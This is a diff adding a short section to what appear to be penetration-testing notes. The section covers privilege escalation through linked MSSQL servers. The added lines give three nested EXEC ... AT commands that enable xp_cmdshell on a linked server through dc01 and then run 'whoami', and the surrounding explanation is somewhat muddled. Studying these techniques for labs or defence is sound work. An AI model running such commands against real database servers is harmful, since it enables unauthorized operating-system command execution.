@@ -57,7 +57,16 @@ For this example, assume that dc01 is the linked server.
 
 **PRIVILEGE ESCALATION THROUGHA LINKED MSSQLSERVER:**
 
+Supose that we have low privileges on our current MSSQL server, however there is a linked MSSQL server where we do have high privileges. So how do we do to gain high privileges on our first MSSQL server?
+(For demonstration purposes we have low privileges on dc01 but high privileges on appsrv01)
 
+Here are the commands we must throw through dc01:
+
+1st ```EXEC ('EXEC (sp_configure "show advanced options", 1; reconfigure;  ) AT appsrv01') AT dc01```
+
+2nd ```EXEC ('EXEC (sp_configure "xp_cmdshell", 1; reconfigure;) AT appsrv01') AT dc01```
+
+3rd ```EXEC ('EXEC (xp_cmdshell "whoami";) AT appsrv01') AT dc01```
 
 
 
